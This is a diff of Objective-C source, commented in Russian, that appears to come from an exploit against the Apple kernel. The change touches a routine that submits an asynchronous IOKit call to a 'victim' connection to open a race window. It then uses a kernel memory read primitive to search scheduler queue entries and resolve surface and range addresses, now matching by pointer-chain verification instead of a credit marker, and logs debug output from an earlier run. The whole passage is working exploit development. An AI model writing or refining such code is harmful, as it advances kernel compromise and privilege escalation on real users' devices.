@@ -5849,20 +5849,17 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     *(uint64_t *)(tsdV + 8) = 1;   // async — execute позже, окно для подмены
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
     kpNote(r, [NSString stringWithFormat:@"  victim async submit (backlog=800): kr=0x%x", avkr]);
-    // entry с credit==0x10 в массиве scheduler'а
+    // Любая запись очереди несёт dstS (churn-опы с теми же srcID/dstID!) —
+    // резолвим chain-верификацией через все записи, credit-маркер не нужен
+    // (прогон 1.9.124: entries=111, victim entry=0).
     uint64_t eptrs[128];
     uint32_t eN = kpM2OCollectEntries(schedVA, eptrs, 128, r);
-    uint64_t entryVA = 0;
-    for (uint32_t i = 0; i < eN; i++) {
-        if (kpM2OMarkerAt(eptrs[i], 0xc3c, 0x10, r)) { entryVA = eptrs[i]; break; }
-    }
-    kpNote(r, [NSString stringWithFormat:@"  entries=%u, victim entry=%#llx", eN, (unsigned long long)entryVA]);
-    // surfVA в записи: поля РЕАЛЬНОЙ записи, верификация ranges-цепочкой
     uint64_t surfVA = 0, rangesVA = 0;
-    if (entryVA) {
+    int matched = 0;
+    for (uint32_t i = 0; i < eN && !rangesVA; i++) {
         for (uint32_t oo = 0; oo <= 0x80 && !rangesVA; oo += 8) {
             uint64_t S = 0;
-            if (!kpRead(entryVA + oo, &S, 8, "ps S", r)) continue;
+            if (!kpRead(eptrs[i] + oo, &S, 8, "ps S", r)) continue;
             S = kp_untag_ptr(S);
             if (!kpLooksLikeKernelPointer(S)) continue;
             uint64_t ro = 0, rq = 0;
@@ -5873,11 +5870,14 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
             surfVA = S;
             rangesVA = ro + 0x18;
-            kpNote(r, [NSString stringWithFormat:@"  ★ entry+%#x: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
-                      oo, (unsigned long long)surfVA, (unsigned long long)ro,
+            matched++;
+            kpNote(r, [NSString stringWithFormat:@"  ★ entry[%u]+%#x: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
+                      i, oo, (unsigned long long)surfVA, (unsigned long long)ro,
                       (unsigned long long)rangesVA, (unsigned long long)rq]);
         }
     }
+    kpNote(r, [NSString stringWithFormat:@"  entries=%u, chain-matched=%d, surfVA=%#llx rangesVA=%#llx",
+              eN, matched, (unsigned long long)surfVA, (unsigned long long)rangesVA]);
     kpNote(r, [NSString stringWithFormat:@"  резолв: surfVA=%#llx rangesVA=%#llx",
               (unsigned long long)surfVA, (unsigned long long)rangesVA]);
     if (!rangesVA) {
